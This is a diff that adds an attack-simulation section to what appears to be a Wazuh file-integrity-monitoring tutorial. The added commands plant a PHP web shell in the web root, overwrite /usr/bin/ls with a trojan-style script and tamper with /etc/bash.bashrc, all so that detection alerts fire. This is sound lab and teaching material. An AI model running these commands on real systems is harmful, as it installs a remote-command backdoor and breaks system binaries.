@@ -102,6 +102,28 @@ You can now see that the Wazuh File Integrity monitoring system is actively repo
 
 ---
 
+# ATTACK SIMULATION & OBSERVE WITH ALERTS
+
+## Let’s simulate three common scenarios:
+
+A. Web Shell Upload Simulation
+```bash
+echo "<?php system(\$_GET['cmd']); ?>" | sudo tee /var/www/html/shell.php
+```
+This mimics an attacker uploading a web shell to your web directory.
+
+B. Replace a Binary (Persistence / Backdoor)
+```bash
+echo -e '#!/bin/bash\necho pwned' | sudo tee /usr/bin/ls
+sudo chmod +x /usr/bin/ls
+```
+This simulates a trojaned binary.
+
+C. Modify Critical Configuration File
+```bash
+echo "alias rm='echo you got hacked'" | sudo tee -a /etc/bash.bashrc
+```
+
 # Thank you.
 
 
